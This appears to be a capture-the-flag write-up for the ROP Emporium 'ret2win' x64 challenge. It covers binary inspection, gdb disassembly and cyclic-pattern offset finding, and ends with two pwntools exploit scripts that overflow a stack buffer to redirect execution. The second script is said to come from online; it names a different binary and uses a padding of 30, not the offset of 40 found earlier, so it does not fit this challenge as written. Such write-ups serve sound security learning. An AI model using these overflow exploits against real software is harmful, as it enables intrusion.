# 1. ret2win

## x64 version

```python
wayell@ubuntu:~/Desktop/ROPEmporium/1.ret2win$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=19abc0b3bb228157af55b8e16af7316d54ab0597, not stripped
```

Normal program execution

```python
wayell@ubuntu:~/Desktop/ROPEmporium/1.ret2win$ ./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> hello
Thank you!

Exiting
```

Strings

```python
wayell@ubuntu:~/Desktop/ROPEmporium/1.ret2win$ strings ret2win
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
printf
memset
read
stdout
system
setvbuf
__libc_start_main
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
ret2win by ROP Emporium
x86_64
Exiting
For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!
Thank you!
Well done! Here's your flag:
/bin/cat flag.txt
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
ret2win.c
pwnme
ret2win
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
stdout@@GLIBC_2.2.5
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
memset@@GLIBC_2.2.5
read@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
setvbuf@@GLIBC_2.2.5
__TMC_END__
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
```

Checking function names

```python
$ nm ret2win|grep ' t '
00000000004005f0 t deregister_tm_clones
0000000000400660 t __do_global_dtors_aux
0000000000400690 t frame_dummy
00000000004006e8 t pwnme
0000000000400620 t register_tm_clones
0000000000400756 t ret2win
```

gdb, checksec

functions: main, pwnme, ret2win

NX is enabled, non-executable stack, means we need to use functions from inside the binary to gain access.

```python
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
```

Disassembly of main:

A few puts functions are called to display the text when we first execute the program

Afterwards, pwnme function is called.

```python
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:	push   rbp
   0x0000000000400698 <+1>:	mov    rbp,rsp
   0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:	mov    ecx,0x0
   0x00000000004006a7 <+16>:	mov    edx,0x2
   0x00000000004006ac <+21>:	mov    esi,0x0
   0x00000000004006b1 <+26>:	mov    rdi,rax
   0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:	mov    edi,0x400808
   0x00000000004006be <+39>:	call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:	mov    edi,0x400820
   0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:	mov    eax,0x0
   0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:	mov    edi,0x400828
   0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:	mov    eax,0x0
   0x00000000004006e6 <+79>:	pop    rbp
   0x00000000004006e7 <+80>:	ret    
End of assembler dump.
```

Disassembly of pwnme:

more puts functions are called

We can see at seems to be assigned some sort of value or size (32 bytes, 0x20 in hex)

At assigned another value or size (56 bytes, 0x38 in hex) and then calls the read function

```python
gdb-peda$ disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400838
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x400898
   0x0000000000400715 <+45>:	call   0x400550 <puts@plt>
   0x000000000040071a <+50>:	mov    edi,0x4008b8
   0x000000000040071f <+55>:	call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:	mov    edi,0x400918
   0x0000000000400729 <+65>:	mov    eax,0x0
   0x000000000040072e <+70>:	call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:	mov    edx,0x38
   0x000000000040073c <+84>:	mov    rsi,rax
   0x000000000040073f <+87>:	mov    edi,0x0
   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
   0x0000000000400749 <+97>:	mov    edi,0x40091b
   0x000000000040074e <+102>:	call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:	nop
   0x0000000000400754 <+108>:	leave  
   0x0000000000400755 <+109>:	ret    
End of assembler dump.
```

**This portion is done after initially completing to fill up gaps**

After looking at the strings search, actually at ***mov    edi,0x400943*** the value of /bin/cat flag.txt string is moved into the RDI register which will be used when doing the system call

Disassembly of ret2win function:

Mainly puts some string and calls system function

```python
gdb-peda$ disas ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:	push   rbp
   0x0000000000400757 <+1>:	mov    rbp,rsp
   0x000000000040075a <+4>:	mov    edi,0x400926
   0x000000000040075f <+9>:	call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:	mov    edi,0x400943
   0x0000000000400769 <+19>:	call   0x400560 <system@plt>
   0x000000000040076e <+24>:	nop
   0x000000000040076f <+25>:	pop    rbp
   0x0000000000400770 <+26>:	ret    
End of assembler dump.
```

You can also list the string at that address using x/s:

```python
pwndbg> x/s 0x400943
0x400943:	"/bin/cat flag.txt"
```

**This portion is done after initially completing to fill up gaps**

With pwndbg we can actually check functions after running the program, sometimes may need to run the program first for correct mem addresses to populate. (run then ctrl c)

We can do p <functionname> to find the memory addresses of functions

```python
pwndbg> p system
$4 = {int (const char *)} 0x7ffff7e15410 <__libc_system>
pwndbg> p pwnme
$5 = {<text variable, no debug info>} 0x4006e8 <pwnme>
pwndbg> p ret2win
$6 = {<text variable, no debug info>} 0x400756 <ret2win>
```

**This portion is done after initially completing to fill up gaps**

We can also search for strings. For example searching for /bin/cat, at some point when exploiting we may call system function, and we want to pass in the string to read our flag. 

```python
pwndbg> search "/bin/cat"
ret2win         0x400943 '/bin/cat flag.txt'
ret2win         0x600943 '/bin/cat flag.txt'
```

Creating pattern of size 100:

```python
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
```

Running the program, and sending our pattern 

```python
gdb-peda$ r
Starting program: /home/wayell/Desktop/ROPEmporium/1.ret2win/ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xb ('\x0b')
RBX: 0x400780 (<__libc_csu_init>:	push   r15)
RCX: 0x7ffff7ed21e7 (<__GI___libc_write+23>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffff7fad723 --> 0xfaf4c0000000000a 
RDI: 0x7ffff7faf4c0 --> 0x0 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdfa8 ("AA0AAFAAbAA1AAGA\263\200\336\367\377\177")
RIP: 0x400755 (<pwnme+109>:	ret)
R8 : 0xb ('\x0b')
R9 : 0x2 
R10: 0xfffffffffffff27a 
R11: 0x246 
R12: 0x4005b0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe0a0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40074e <pwnme+102>:	call   0x400550 <puts@plt>
   0x400753 <pwnme+107>:	nop
   0x400754 <pwnme+108>:	leave  
=> 0x400755 <pwnme+109>:	ret    
   0x400756 <ret2win>:	push   rbp
   0x400757 <ret2win+1>:	mov    rbp,rsp
   0x40075a <ret2win+4>:	mov    edi,0x400926
   0x40075f <ret2win+9>:	call   0x400550 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfa8 ("AA0AAFAAbAA1AAGA\263\200\336\367\377\177")
0008| 0x7fffffffdfb0 ("bAA1AAGA\263\200\336\367\377\177")
0016| 0x7fffffffdfb8 --> 0x7ffff7de80b3 (<__libc_start_main+243>:	mov    edi,eax)
0024| 0x7fffffffdfc0 --> 0x100000060 
0032| 0x7fffffffdfc8 --> 0x7fffffffe0a8 --> 0x7fffffffe3b5 ("/home/wayell/Desktop/ROPEmporium/1.ret2win/ret2win")
0040| 0x7fffffffdfd0 --> 0x1f7fa9618 
0048| 0x7fffffffdfd8 --> 0x400697 (<main>:	push   rbp)
0056| 0x7fffffffdfe0 --> 0x400780 (<__libc_csu_init>:	push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400755 in pwnme ()
```

We can see that RIP did not actually get overwritten. The program still crashed, but not because we overwrote RIP with a invalid address, but instead it raises an exception. In 64 bit, it will not pop a value into RIP if it cannot actually jump to and execute at that address.

From [https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/)

> So the program crashed as expected, but not because we overwrote RIP with an invalid address. In fact we don’t control RIP at all. Recall as I mentioned earlier that the maximum address size is 0x00007FFFFFFFFFFF. We’re overwriting RIP with a non-canonical address of 0x4141414141414141 which causes the processor to raise an exception. In order to control RIP, we need to overwrite it with 0x0000414141414141 instead. So really the goal is to find the offset with which to overwrite RIP with a canonical address. We can use a cyclic pattern to find this offset:
> 

```python
[----------------------------------registers-----------------------------------]
RAX: 0xb ('\x0b')
RBX: 0x400780 (<__libc_csu_init>:	push   r15)
RCX: 0x7ffff7ed21e7 (<__GI___libc_write+23>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffff7fad723 --> 0xfaf4c0000000000a 
RDI: 0x7ffff7faf4c0 --> 0x0 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffdfa8 ("AA0AAFAAbAA1AAGA\263\200\336\367\377\177")
RIP: 0x400755 (<pwnme+109>:	ret)
R8 : 0xb ('\x0b')
R9 : 0x2 
R10: 0xfffffffffffff27a 
R11: 0x246 
R12: 0x4005b0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe0a0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
```

Parts of our pattern is on the stack:

```python
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdfa8 ("AA0AAFAAbAA1AAGA\263\200\336\367\377\177")
0008| 0x7fffffffdfb0 ("bAA1AAGA\263\200\336\367\377\177")
0016| 0x7fffffffdfb8 --> 0x7ffff7de80b3 (<__libc_start_main+243>:	mov    edi,eax)
0024| 0x7fffffffdfc0 --> 0x100000060 
0032| 0x7fffffffdfc8 --> 0x7fffffffe0a8 --> 0x7fffffffe3b5 ("/home/wayell/Desktop/ROPEmporium/1.ret2win/ret2win")
0040| 0x7fffffffdfd0 --> 0x1f7fa9618 
0048| 0x7fffffffdfd8 --> 0x400697 (<main>:	push   rbp)
0056| 0x7fffffffdfe0 --> 0x400780 (<__libc_csu_init>:	push   r15)
```

To find the offset, we can take the value which RSP was overwritten with, and look for the pattern offset.

gdb tells us the offset is at 40. This means that our RIP address starts at 40 and we can overwrite it by adding an additional 8 bytes after offset of 40 bytes.

```python
gdb-peda$ x/wx $rsp
0x7fffffffdfa8:	0x41304141
gdb-peda$ pattern offset 0x41304141
1093681473 found at offset: 40
```

We can get a solver using pwntools. 

```python
wayell@ubuntu:~/Desktop/ROPEmporium/1.ret2win$ python3 solve2.py
[*] '/home/wayell/Desktop/ROPEmporium/1.ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/wayell/Desktop/ROPEmporium/1.ret2win/ret2win': pid 2798
/home/wayell/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
 [*] Process '/home/wayell/Desktop/ROPEmporium/1.ret2win/ret2win' stopped with exit code 0 (pid 2798)
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

**This portion is done after initially completing to fill up gaps**

Solvers are changed from initial ones, since it did not print the flag although it jumped to the correct function

Solver 1 (using attach process, hardcoded address for ret)

```python
from pwn import *

# Pwntools attach to binary
elf = context.binary = ELF('ret2win')
p = process()

# Number of padding bytes (to offset RIP)
padding = 40

# Crafting payload, contains x nops of padding, ret, hardcoded address
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	p64(0x400756),
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

# Send payload after asked for input
p.sendlineafter(">", payload)

p.interactive()
```

Solver 2 (from online)

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('game_12dcfaa0-ade2-43fe-b79f-288b3b9560f8')
p = process()

# Number of padding bytes (to offset RIP)
padding = 30

# Crafting payload, contains x nops of padding, ret, address of ret2win using symbols function
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	elf.symbols['ret2win'],
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

# Send payload after asked for input
p.sendlineafter(">", payload)

p.interactive()
```